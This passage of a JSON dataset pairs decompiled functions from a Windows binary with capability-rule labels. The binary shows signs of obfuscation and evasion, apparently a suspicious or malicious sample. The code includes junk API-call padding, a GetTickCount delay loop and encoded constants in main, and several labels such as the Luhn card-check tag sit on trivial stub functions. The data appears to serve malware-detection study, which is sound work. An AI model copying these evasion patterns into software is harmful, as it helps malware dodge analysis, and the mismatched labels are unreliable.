if (uVar1 < uVar7) {\n            if (iVar3 - (uVar1 >> 1) < uVar1) {\n                uVar1 = 0;\n            }\n            else {\n                uVar1 = uVar1 + (uVar1 >> 1);\n            }\n            *(unaff_EBP + -0x14) = uVar1;\n            if (uVar1 < uVar7) {\n                *(unaff_EBP + -0x14) = uVar7;\n                uVar1 = uVar7;\n            }\n            uVar4 = fcn.00404916(uVar1);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = *(extraout_ECX + 0xc);\n            *(unaff_EBP + -0x18) = uVar4;\n            *(unaff_EBP + 0x10) = uVar4;\n            uVar2 = fcn.00405469(uVar2, *(unaff_EBP + 0xc), uVar4);\n            *(unaff_EBP + 0x10) = uVar2;\n            uVar4 = fcn.00405447(uVar2, arg_ch, *(unaff_EBP + 0x14));\n            uVar2 = *(extraout_ECX + 0x10);\n            *(unaff_EBP + 0x10) = uVar4;\n            fcn.00405469(*(unaff_EBP + 0xc), uVar2, uVar4);\n            iVar5 = fcn.0040469f();\n            if (*(extraout_ECX + 0xc) != 0) {\n                fcn.00405335(*(extraout_ECX + 0xc), *(extraout_ECX + 0x10));\n                fcn.004046bd(*(extraout_ECX + 0xc));\n            }\n            iVar3 = *(unaff_EBP + -0x18);\n            *(extraout_ECX + 0x14) = uVar1 * 0x1c + iVar3;\n            *(extraout_ECX + 0x10) = (arg_ch + iVar5) * 0x1c + iVar3;\n            *(extraout_ECX + 0xc) = iVar3;\n        }\n        else {\n            if ((*(extraout_ECX + 0x10) - *(unaff_EBP + 0xc)) / 0x1c < arg_ch) {\n                fcn.00404e70(*(unaff_EBP + 0x14));\n                uVar2 = *(extraout_ECX + 0x10);\n                *(unaff_EBP + -4) = 2;\n                fcn.00405469(*(unaff_EBP + 0xc), uVar2, arg_ch * 0x1c + *(unaff_EBP + 0xc));\n                iVar5 = *(extraout_ECX + 0x10);\n                *(unaff_EBP + -4) = 3;\n                fcn.00405447(*(extraout_ECX + 0x10), arg_ch - (iVar5 - *(unaff_EBP + 0xc)) / 0x1c, unaff_EBP + -0x38);\n                *(extraout_ECX + 0x10) = *(extraout_ECX + 0x10) + arg_ch * 0x1c;\n                iVar5 = *(extraout_ECX + 0x10);\n                *(unaff_EBP + -4) = 2;\n                fcn.004051b1(*(unaff_EBP + 0xc), iVar5 + arg_ch * -0x1c, unaff_EBP + -0x38);\n            }\n            else {\n                fcn.00404e70(*(unaff_EBP + 0x14));\n                uVar2 = *(extraout_ECX + 0x10);\n                *(unaff_EBP + 0x14) = uVar2;\n                *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + arg_ch * -0x1c;\n                *(unaff_EBP + -4) = 5;\n                uVar6 = fcn.00405469(*(unaff_EBP + 0x14), uVar2, uVar2);\n                uVar4 = *(unaff_EBP + 0x14);\n                *(extraout_ECX + 0x10) = uVar6;\n                fcn.00405482(*(unaff_EBP + 0xc), uVar4, uVar2);\n                fcn.004051b1(*(unaff_EBP + 0xc), arg_ch * 0x1c + *(unaff_EBP + 0xc), unaff_EBP + -0x54);\n            }\n            fcn.00404c2d();\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1471
    },
    "0040370f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040370f(uint *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *arg_8h = arg_10h;\n    return;\n}\n",
        "token_count": 55
    },
    "00403a33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403a33(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00403b53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpCollectDataTimeout\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: lpState\n// WARNING: Variable defined which should be unmapped: lpCurInstances\n// WARNING: Variable defined which should be unmapped: lpMaxCollectionCount\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesWritten\n\nuint fcn.00403b53(void)\n\n{\n    code *pcVar1;\n    int32_t unaff_ESI;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uchar auStackY14468 [2048];\n    uchar auStackY12420 [1024];\n    uchar auStackY11396 [2048];\n    uchar auStackY9348 [1024];\n    uchar auStackY8324 [1024];\n    uint lpStruct;\n    uint lpBuffer;\n    uint var_1480h;\n    uint lpOutBuffer;\n    uint var_c80h;\n    uint lpUserName;\n    uint lpszVolumeName;\n    uint uStackY480;\n    uint uStackY476;\n    uint uStackY472;\n    uint uStackY468;\n    uint *puStackY464;\n    uint uStackY460;\n    uint uStackY456;\n    uint *puStackY452;\n    uint *puStackY448;\n    uint uStackY444;\n    uint uStackY440;\n    uint uStackY436;\n    uint uStackY432;\n    uint uStackY428;\n    uint *puStackY424;\n    uint *puStackY420;\n    uint uStackY416;\n    uint uStackY412;\n    uint *puStackY408;\n    uint uStackY404;\n    uint uStackY400;\n    uint uStackY396;\n    uint uStackY392;\n    uint uStackY388;\n    uint *puStackY384;\n    uint uStackY380;\n    uint uStackY376;\n    uint uStackY372;\n    uint uStackY368;\n    uint uStackY364;\n    uint uStackY360;\n    uint *puStackY356;\n    uchar *puStackY352;\n    uint uStackY348;\n    uint uStackY344;\n    uint uStackY340;\n    uint uStackY336;\n    uint uStackY332;\n    uint uStackY328;\n    uint *puStackY324;\n    uint uStackY320;\n    uint *puStackY316;\n    uint *puStackY312;\n    uint uStackY308;\n    uint uStackY304;\n    uint uStackY300;\n    uint uStackY296;\n    uint uStackY292;\n    uchar *puStackY288;\n    uint *puStackY284;\n    uint uStackY280;\n    uint uStackY276;\n    uint uStackY272;\n    uint uStackY268;\n    uchar *puStackY264;\n    uint *puStackY260;\n    uint uStackY256;\n    uchar *puStackY252;\n    uint uStackY248;\n    uint uStackY244;\n    uchar *puStackY240;\n    uint uStackY236;\n    uint uStackY232;\n    uint uStackY228;\n    uint uStackY224;\n    uint uStackY220;\n    uint uStackY216;\n    uint uStackY212;\n    uint uStackY208;\n    uint uStackY204;\n    uint *puStackY200;\n    uint *puStackY196;\n    uint uStackY192;\n    uint uStackY188;\n    uint uStackY184;\n    uint uStackY180;\n    uint uStackY176;\n    uint uStackY172;\n    uint uStackY168;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint uStackY152;\n    uint uStackY148;\n    uint uStackY144;\n    uint *puStackY140;\n    uint uStackY136;\n    uint uStackY132;\n    int32_t iStackY128;\n    uint uStackY124;\n    uint *var_74h;\n    uint hEvent;\n    uint uStackY112;\n    uint uStackY108;\n    uint uStackY104;\n    uint uStackY100;\n    uint uStackY96;\n    uint *var_58h;\n    uint *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint lpOverlapped;\n    uint *var_44h;\n    uint uStackY68;\n    uint *puStackY64;\n    uint *puStackY60;\n    uint var_34h;\n    uint *lpFilePart;\n    uint lpBytesRead;\n    uint *lpNumberOfEventsWritten;\n    uint *nSize;\n    uint *ListHead;\n    uint *var_1ch;\n    uint *var_18h;\n    uint32_t lpState;\n    uint lpCurInstances;\n    uint32_t lpCollectDataTimeout;\n    int32_t lpNumberOfBytesWritten;\n    int32_t lpMaxCollectionCount;\n    \n    lpMaxCollectionCount = 0x403b60;\n    fcn.00405cb0();\n    iVar2 = 0;\n    lpCollectDataTimeout = unaff_EDI;\n    lpNumberOfBytesWritten = unaff_ESI;\n    do {\n        if (iVar2 == 0x13e6) {\n            *0x5d6394 = *0x5d6394 + 0x38d6;\n        }\n        if (*0x5d6394 == 0xbc4) {\n            lpCurInstances = 0x4013fc;\n            lpState = 0x403b91;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x31a4c2);\n    lpCurInstances = 0x403b9f;\n    fcn.00403b3f();\n    uVar3 = 0;\n    if (*0x5d6394 != 0) {\n        do {\n            lpState = 0x403baf;\n            lpCollectDataTimeout = uVar3;\n            fcn.004038d0(uVar3);\n            if (*0x5d6394 == 0x1af) {\n                lpState = 0;\n                var_18h = &fcn.00403b53::lpUserName;\n                var_1ch = &fcn.00403b53::lpCollectDataTimeout;\n                ListHead = &fcn.00403b53::lpMaxCollectionCount;\n                nSize = &fcn.00403b53::lpCurInstances;\n                lpNumberOfEventsWritten = &fcn.00403b53::lpState;\n                lpBytesRead = 0;\n                lpFilePart = 0x403bda;\n                (*_sym.imp.KERNEL32.dll_GetNamedPipeHandleStateW)();\n                lpFilePart = &fcn.00403b53::var_18h;\n                var_34h = 0x403be4;\n                (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *0x5d6394);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetConsoleFontSize;\n    lpMaxCollectionCount = 0x91973f;\n    do {\n        if (*0x5d6394 == 0x465) {\n            lpCurInstances = 0x403c10;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthA)();\n            lpCurInstances = 0;\n            lpState = 0;\n            var_18h = NULL;\n            var_1ch = NULL;\n            ListHead = 0x403c1a;\n            (*_sym.imp.KERNEL32.dll_EnumCalendarInfoW)();\n            ListHead = NULL;\n            nSize = NULL;\n            lpNumberOfEventsWritten = 0x403c22;\n            (*_sym.imp.KERNEL32.dll_GetConsoleMode)();\n            lpNumberOfEventsWritten = NULL;\n            lpBytesRead = 0;\n            lpFilePart = NULL;\n            var_34h = 0x403c2b;\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)();\n            var_34h = 0;\n            puStackY60 = &fcn.00403b53::var_18h;\n            puStackY64 = 0x403c36;\n            (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)();\n            puStackY64 = NULL;\n            uStackY68 = 0;\n            var_44h = &fcn.00403b53::lpState;\n            lpOverlapped = 0x403c42;\n            (*_sym.imp.KERNEL32.dll_InterlockedCompareExchange)();\n            lpOverlapped = 0;\n            uStackY80 = 0x403c49;\n            (*_sym.imp.KERNEL32.dll_ConvertThreadToFiber)();\n            uStackY80 = 0;\n            uStackY84 = 0;\n            puStackY88 = &fcn.00403b53::lpStruct;\n            var_58h = NULL;\n            uStackY96 = 0;\n            uStackY100 = 0x403c5a;\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructA)();\n            uStackY100 = 0;\n            uStackY104 = 0;\n            uStackY108 = 0;\n            uStackY112 = 0;\n            hEvent = 0x403c64;\n            (*_sym.imp.KERNEL32.dll_GetOverlappedResult)();\n            hEvent = 0;\n            var_74h = &fcn.00403b53::var_58h;\n            uStackY124 = 0x403c6b;\n            (*pcVar1)();\n            uStackY124 = 0;\n            iStackY128 = 0;\n            uStackY132 = 0;\n            uStackY136 = 0x403c74;\n            (*_sym.imp.KERNEL32.dll_FindResourceW)();\n            uStackY136 = 0;\n            puStackY140 = 0x403c7b;\n            (*_sym.imp.KERNEL32.dll_InitAtomTable)();\n            puStackY140 = &fcn.00403b53::lpNumberOfEventsWritten;\n            uStackY144 = 0;\n            uStackY148 = 0;\n            uStackY152 = 0;\n            uStackY156 = 0x403c88;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleInputW)();\n            uStackY156 = 0;\n            uStackY160 = 0;\n            uStackY164 = 0x403c90;\n            (*_sym.imp.KERNEL32.dll_SetCommState)();\n            uStackY164 = 0;\n            uStackY168 = 0x403c97;\n            (*_sym.imp.KERNEL32.dll_GlobalUnfix)();\n            uStackY168 = 0;\n            uStackY172 = 0x403c9e;\n            (*_sym.imp.KERNEL32.dll_LocalLock)();\n            uStackY172 = 0;\n            uStackY176 = 0;\n            uStackY180 = 0;\n            uStackY184 = 0x403ca7;\n            (*_sym.imp.KERNEL32.dll_CreateMutexW)();\n            uStackY184 = 0;\n            uStackY188 = 0;\n            uStackY192 = 0x403caf;\n            (*_sym.imp.KERNEL32.dll_MoveFileW)();\n            uStackY192 = 0;\n            puStackY196 = 0x403cb6;\n            (*_sym.imp.KERNEL32.dll_LocalCompact)();\n            puStackY196 = &fcn.00403b53::hEvent;\n            puStackY200 = 0x403cc0;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)();\n            puStackY200 = &fcn.00403b53::lpBuffer;\n            uStackY204 = 0;\n            uStackY208 = 0x403cce;\n            (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n            uStackY208 = 0x401410;\n            uStackY212 = 0x401418;\n            uStackY216 = 0x403cde;\n            (*_sym.imp.KERNEL32.dll_MoveFileA)();\n            uStackY216 = 0;\n            uStackY220 = 0;\n            uStackY224 = 0;\n            uStackY228 = 0;\n            uStackY232 = 0;\n            uStackY236 = 0x403ce9;\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n            uStackY236 = 0;\n            puStackY240 = &stack0xffffd37c;\n            uStackY244 = 0;\n            uStackY248 = 0x403cf8;\n            (*_sym.imp.KERNEL32.dll_GetShortPathNameW)();\n            uStackY248 = 0;\n            puStackY252 = &stack0xffffc77c;\n            uStackY256 = 0;\n            puStackY260 = 0x403d07;\n            (*_sym.imp.KERNEL32.dll_GetVolumePathNameW)();\n            puStackY260 = &fcn.00403b53::nSize;\n            puStackY264 = &stack0xffffdf7c;\n            uStackY268 = 0;\n            uStackY272 = 0x403d19;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameExA)();\n            uStackY272 = 0;\n            uStackY276 = 0;\n            uStackY280 = 0;\n            puStackY284 = 0x403d22;\n            (*_sym.imp.KERNEL32.dll_CopyFileA)();\n            puStackY284 = &fcn.00403b53::lpFilePart;\n            puStackY288 = &stack0xffffdb7c;\n            uStackY292 = 0;\n            uStackY296 = 0;\n            uStackY300 = 0;\n            uStackY304 = 0;\n            uStackY308 = 0x403d37;\n            (*_sym.imp.KERNEL32.dll_SearchPathA)();\n            uStackY308 = 0;\n            puStackY312 = 0x403d3e;\n            (*_sym.imp.KERNEL32.dll_GetCurrentActCtx)();\n            lpOverlapped = 0;\n            var_44h = NULL;\n            uStackY68 = 0;\n            puStackY64 = NULL;\n            puStackY60 = NULL;\n            puStackY312 = &fcn.00403b53::lpOverlapped;\n            puStackY316 = &fcn.00403b53::lpBytesRead;\n            uStackY320 = 0;\n            puStackY324 = &fcn.00403b53::lpOutBuffer;\n            uStackY328 = 0;\n            uStackY332 = 0;\n            uStackY336 = 0;\n            uStackY340 = 0x403d63;\n            (*_sym.imp.KERNEL32.dll_TransactNamedPipe)();\n            uStackY340 = 0;\n            uStackY344 = 0x403d6a;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesW)();\n            uStackY344 = 0;\n            uStackY348 = 0;\n            puStackY352 = &stack0xffffcf7c;\n            puStackY356 = 0x403d79;\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileSectionNamesA)();\n            puStackY356 = &fcn.00403b53::lpCurInstances;\n            uStackY360 = 0;\n            uStackY364 = 0x401420;\n            uStackY368 = 0;\n            uStackY372 = 0;\n            uStackY376 = 0x403d8b;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)();\n            uStackY376 = 0;\n            uStackY380 = 0;\n            puStackY384 = &fcn.00403b53::var_1480h;\n            uStackY388 = 0;\n            uStackY392 = 0;\n            uStackY396 = 0x403d9c;\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileStructA)();\n            uStackY396 = 0;\n            uStackY400 = 0;\n            uStackY404 = 0;\n            puStackY408 = 0x403da5;\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileSectionA)();\n            puStackY408 = &fcn.00403b53::ListHead;\n            ListHead = NULL;\n            var_1ch = NULL;\n            uStackY412 = 0x403db5;\n            (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)();\n            uStackY412 = 0;\n            uStackY416 = 0;\n            puStackY420 = 0x403dbd;\n            (*_sym.imp.KERNEL32.dll_EnumSystemLocalesW)();\n            puStackY420 = &fcn.00403b53::var_34h;\n            puStackY424 = &fcn.00403b53::var_c80h;\n            uStackY428 = 0x403dce;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameA)();\n            uStackY428 = 0;\n            uStackY432 = 0;\n            uStackY436 = 0;\n            uStackY440 = 0;\n            uStackY444 = 0x403dd8;\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)();\n            uStackY444 = 0;\n            puStackY448 = &fcn.00403b53::lpszVolumeName;\n            puStackY452 = 0x403de6;\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n            puStackY452 = &fcn.00403b53::lpCollectDataTimeout;\n            uStackY456 = 0;\n            uStackY460 = 0;\n            puStackY464 = &fcn.00403b53::lpNumberOfBytesWritten;\n            uStackY468 = 0;\n            uStackY472 = 0;\n            uStackY476 = 0;\n            lpCollectDataTimeout = 0;\n            uStackY480 = 0x403dfc;\n            (*_sym.imp.KERNEL32.dll_BackupWrite)();\n        }\n        lpMaxCollectionCount = lpMaxCollectionCount + -1;\n    } while (lpMaxCollectionCount != 0);\n    uVar3 = 0;\n    do {\n        if (uVar3 < 0x1c860) {\n            lpCurInstances = 0x403e15;\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n    } while ((((uVar3 < 0x1e97427c) || (lpNumberOfBytesWritten == 0xace7c8)) || (var_74h == 0xad642ec)) &&\n            (uVar3 = uVar3 + 1,  uVar3 < 0x8e2a6250));\n    iVar2 = 0;\n    do {\n        if (*0x5d6394 == 0x92) {\n            lpCurInstances = 0;\n            lpState = 0;\n            var_18h = NULL;\n            var_1ch = NULL;\n            ListHead = NULL;\n            nSize = NULL;\n            lpNumberOfEventsWritten = NULL;\n            lpBytesRead = 0x403e53;\n            (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n        }\n        if (iVar2 == 0xa9a9) {\n            lpCurInstances = 0x5bd148;\n            lpState = 0x403e66;\n            *0x5d6390 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x25563);\n    *0x5bd148 = 0;\n    iVar2 = 0;\n    do {\n        if (iVar2 == 0x148) {\n            lpCurInstances = 0x403e89;\n            fcn.00403a41();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x427fa7);\n    lpCurInstances = 0x419010;\n    lpState = *0x5d6394;\n    var_18h = *0x5d5f40;\n    var_1ch = 0x403ea8;\n    fcn.0040386a(*0x5d5f40, *0x5d6394, 0x419010);\n    iVar2 = 0;\n    do {\n        if (*0x5d6394 == 0x10) {\n            var_1ch = NULL;\n            ListHead = 0x403eba;\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n        }\n        if (iVar2 == 0x2f7e4) {\n            var_1ch = 0x403ec7;\n            fcn.00403a33();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x48122);\n    var_1ch = 0x403ed5;\n    fcn.00403668();\n    if (*0x5d6394 == 0x58c) {\n        var_1ch = NULL;\n        ListHead = 0x403ee8;\n        (*_sym.imp.KERNEL32.dll_LocalFlags)();\n        ListHead = NULL;\n        nSize = &fcn.00403b53::lpszVolumeName;\n        lpNumberOfEventsWritten = 0x403ef6;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeA)();\n        lpNumberOfEventsWritten = NULL;\n        lpBytesRead = 0;\n        lpFilePart = 0x403efa;\n        (*pcVar1)();\n        lpMaxCollectionCount = 0;\n        lpFilePart = &fcn.00403b53::lpNumberOfBytesWritten;\n        var_34h = 0;\n        puStackY64 = &fcn.00403b53::lpCurInstances;\n        puStackY60 = NULL;\n        uStackY68 = 0;\n        var_44h = 0x403f18;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleOutputAttribute)();\n        var_44h = NULL;\n        lpOverlapped = 0;\n        uStackY80 = 0x403f20;\n        (*_sym.imp.KERNEL32.dll_CreateJobObjectW)();\n        uStackY80 = 0x40142c;\n        uStackY84 = 0x403f2b;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        uStackY84 = 0;\n        puStackY88 = NULL;\n        var_58h = &fcn.00403b53::var_c80h;\n        uStackY96 = 0;\n        uStackY100 = 0;\n        uStackY104 = 0;\n        uStackY108 = 0;\n        uStackY112 = 0x403f3e;\n        (*_sym.imp.KERNEL32.dll_FormatMessageA)();\n        uStackY112 = 0;\n        hEvent = 0;\n        var_74h = NULL;\n        uStackY124 = 0x403f47;\n        (*_sym.imp.KERNEL32.dll_FindResourceW)();\n        uStackY124 = 0;\n        iStackY128 = lpNumberOfBytesWritten;\n        uStackY132 = 0;\n        uStackY136 = 0x403f52;\n        (*_sym.imp.KERNEL32.dll_SetHandleInformation)();\n        uStackY136 = 0;\n        puStackY140 = 0x403f59;\n        (*_sym.imp.KERNEL32.dll_DeleteTimerQueue)();\n        puStackY140 = NULL;\n        uStackY144 = 0x403f60;\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n    }\n    var_1ch = 0x403f65;\n    fcn.00403a2d();\n    return 0;\n}\n",
        "token_count": 5307
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain obfuscated stackstrings",
            "contain loop",
            "create directory",
            "move file",
            "copy file",
            "set console window title"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    uint var_c4h;\n    uint var_a8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint uExitCode;\n    \n    var_88h = 0x4e68b279;\n    var_3ch = 0xaeba94e2;\n    var_44h = 0xa549289f;\n    var_38h = 0x1e9cb630;\n    var_64h = 0xa5aa0364;\n    uExitCode = 0x3ce246a5;\n    var_34h = 0xf3cb2db0;\n    var_6ch = 0x7ca19048;\n    var_58h = 0x1c08b058;\n    var_60h = 0x94d763b8;\n    var_90h = 0xa52d63a6;\n    var_20h = 0xe4d18634;\n    var_24h = 0x7a815d21;\n    var_78h = 0x63860979;\n    var_ch = 0x20ce1d5;\n    var_28h = 0xe4924575;\n    var_50h = 0x2eefa4a8;\n    var_2ch = 0xfdf29d86;\n    var_68h = 0x8e7447b6;\n    var_4ch = 0x74c8ead3;\n    var_80h = 0x77b1668a;\n    var_40h = 0xae43e453;\n    var_14h = 0xa31b2925;\n    var_8h = 0xa717e16b;\n    var_10h = 0x7972aa5;\n    var_1ch = 0xd35f6e90;\n    var_30h = 0xa2d3262c;\n    var_70h = 0x416a41bf;\n    var_84h = 0x766d327e;\n    var_8ch = 0x8879bd3c;\n    var_48h = 0xf04ca510;\n    var_5ch = 0xe42d5047;\n    var_74h = 0xc65f797b;\n    var_54h = 0xd66afa29;\n    var_7ch = 0xbb5593ae;\n    var_18h = 0xd4f34e57;\n    if (*0x5d6394 == 0x9e) {\n        fcn.00406884(0, 0, 0);\n        fcn.00406741(0, 0);\n        fcn.00406724(0, 0);\n        fcn.0040666e(0);\n        fcn.004052f5();\n        fcn.0040501e(0x401438);\n        fcn.00405776(&var_c4h);\n        fcn.00404c2d();\n        fcn.00406557();\n        fcn.0040654c(0);\n        fcn.0040646c(0);\n        fcn.0040638f(0);\n        fcn.0040634f(0, 0);\n        fcn.0040631b(0);\n        fcn.004054dd();\n    }\n    *0x5d6394 = *0x4192e4;\n    if (*0x4192e4 == 0x81) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(&lpString1, 0x401440, 0);\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_TerminateJobObject)(0, uExitCode);\n        (*_sym.imp.KERNEL32.dll_GlobalFindAtomW)(0);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x401494);\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExA)(0x4014f0, 0x4014cc, 0);\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(0x40150c);\n        (*_sym.imp.KERNEL32.dll_ClearCommError)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetVolumeMountPointW)(0x401564, 0x40152c);\n        (*_sym.imp.KERNEL32.dll_SetConsoleTitleW)(0);\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(0);\n        (*_sym.imp.KERNEL32.dll_GetThreadPriority)(0);\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(0x40159c);\n        (*_sym.imp.KERNEL32.dll_MoveFileW)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GenerateConsoleCtrlEvent)(0, 0);\n        (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x4015d0);\n    }\n    iVar1 = 0x79a863;\n    do {\n        if (*0x5d6394 == 0x4c5) {\n            (*_sym.imp.KERNEL32.dll_GetNamedPipeInfo)(0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObjectEx)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(0, 0);\n        }\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *0x5d67a8 = *0x419008;\n    fcn.00403b53();\n    return 0;\n}\n",
        "token_count": 1546
    },
    "00404749": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404749(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    cVar2 = fcn.00403660();\n    if (cVar2 == '\\0') {\n        fcn.00405e38();\n    }\n    uVar1 = *(in_ECX + 4) + arg_8h * 0x1c;\n    iVar3 = fcn.0040363f();\n    if (uVar1 < *(iVar3 + 0x10) || uVar1 == *(iVar3 + 0x10)) {\n        iVar3 = fcn.0040363f();\n        if (*(iVar3 + 0xc) <= uVar1) goto code_r0x00404788;\n    }\n    fcn.00405e38();\ncode_r0x00404788:\n    *(in_ECX + 4) = *(in_ECX + 4) + arg_8h * 0x1c;\n    return;\n}\n",
        "token_count": 240
    },
    "00404874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404874(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004035e2(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "00404898": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404898(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004035fe(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 62
    },
    "004048e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004048e7(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint *arg_ch;\n    uint var_1h;\n    \n    arg_ch = &var_1h;\n    *(in_ECX + 0x14) = arg_8h;\n    iVar1 = fcn.004046af();\n    fcn.004035bf(iVar1 + arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 126
    },
    "0040490e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040490e(void)\n\n{\n    return 0x9249249;\n}\n",
        "token_count": 22
    },
    "00404a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
